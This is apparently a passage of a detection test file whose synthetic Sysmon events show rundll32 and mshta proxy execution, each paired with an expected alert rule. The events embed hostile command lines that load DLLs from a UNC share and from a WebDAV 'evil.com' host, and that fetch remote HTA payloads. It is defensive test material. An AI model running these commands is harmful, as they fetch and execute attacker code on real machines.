    {
      "name": "attack rundll32 02 | Public dll entry point",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:28:55.521638472Z\",\"eventRecordID\":\"550066\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:28:55.521\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\aa.dll,EntryPoint\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\aa.dll,EntryPoint\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 03 | ProgramData dll service init",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:29:42.307668150Z\",\"eventRecordID\":\"550067\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:29:42.307\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\ProgramData\\\\cache\\\\helper.dll,Init\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\ProgramData\\\\cache\\\\helper.dll,Init\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 04 | Windows Temp dll ServiceMain",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:31:47.670499515Z\",\"eventRecordID\":\"550068\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:31:47.670\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Windows\\\\Temp\\\\update.dll,ServiceMain\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Windows\\\\Temp\\\\update.dll,ServiceMain\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 05 | Downloads dll Start",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:33:00.036363902Z\",\"eventRecordID\":\"550069\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:33:00.036\",\"processGuid\":\"{1d14b092-97a2-970e-8eb1-000000000017}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Administrator\\\\Downloads\\\\stage.dll,Start\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 06 | UNC share beacon dll | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:33:47.452812678Z\",\"eventRecordID\":\"550070\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:33:47.452\",\"processGuid\":\"{5343e9c1-4521-263b-1346-000000000025}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\\\\\\10.42.0.15\\\\share\\\\beacon.dll,DllMain\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{12aa9a1a-d117-1565-dd16-000000000020}\",\"parentProcessId\":\"3973\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentCommandLine\":\"powershell.exe -NoProfile -Command \\\"rundll32.exe \\\\\\\\10.42.0.15\\\\share\\\\beacon.dll,DllMain\\\"\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": true,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 07 | WebDAV remote dll | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:35:12.125688204Z\",\"eventRecordID\":\"550071\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:35:12.125\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\\\\\\evil.com@80\\\\test.dll,Exec\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe \\\\\\\\evil.com@80\\\\test.dll,Exec\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": true,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 08 | ordinal export #1 | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:37:12.587029524Z\",\"eventRecordID\":\"550072\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:37:12.587\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\aa.dll,#1\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\aa.dll,#1\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": true,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 09 | hidden .dat extension | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:37:43.206208022Z\",\"eventRecordID\":\"550073\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:37:43.206\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\invoice.dat,Print\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\invoice.dat,Print\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": true,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 10 | hidden .png extension",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:39:43.890424394Z\",\"eventRecordID\":\"550074\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:39:43.890\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\logo.png,Export\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\logo.png,Export\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 11 | quoted My Documents dll | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:40:59.215798675Z\",\"eventRecordID\":\"550075\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:40:59.215\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Users\\\\Default\\\\My Documents\\\\secret.dll\\\",EntryPoint\",\"currentDirectory\":\"C:\\\\Users\\\\Default\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe \\\"C:\\\\Users\\\\Default\\\\My Documents\\\\secret.dll\\\",EntryPoint\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": true,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 12 | Public dll DllRegisterServer",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:42:32.786012923Z\",\"eventRecordID\":\"550076\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:42:32.786\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Public\\\\dd.dll,DllRegisterServer\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Public\\\\dd.dll,DllRegisterServer\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 13 | Temp dll with data argument",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:43:29.348039550Z\",\"eventRecordID\":\"550077\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:43:29.348\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\crypt.dll,Decrypt C:\\\\Users\\\\Administrator\\\\Documents\\\\data.bin\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\crypt.dll,Decrypt C:\\\\Users\\\\Administrator\\\\Documents\\\\data.bin\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 14 | quoted Public dll",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:44:20.100748341Z\",\"eventRecordID\":\"550078\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:44:20.100\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe \\\"C:\\\\Users\\\\Public\\\\ee.dll\\\",Run\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe \\\"C:\\\\Users\\\\Public\\\\ee.dll\\\",Run\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack rundll32 15 | ProgramData Packages dll",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:46:17.691696342Z\",\"eventRecordID\":\"550079\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:46:17.691\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\ProgramData\\\\Packages\\\\payload.dll,entry\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\ProgramData\\\\Packages\\\\payload.dll,entry\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
    {
      "name": "attack mshta 01 | remote HTA 192.168.1.50",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:47:09.339091489Z\",\"eventRecordID\":\"550080\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:47:09.339\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe http://192.168.1.50/run.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe http://192.168.1.50/run.hta\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 02 | remote HTA lab host",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:49:29.123076928Z\",\"eventRecordID\":\"550081\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:49:29.123\",\"processGuid\":\"{fa3887bb-e1bd-ecc7-1775-000000000027}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe http://10.42.0.15/payload.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{90e93c09-9882-4c95-e2ce-000000000023}\",\"parentProcessId\":\"6780\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\winrshost.exe\",\"parentCommandLine\":\"winrshost.exe\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 03 | quoted remote HTA",
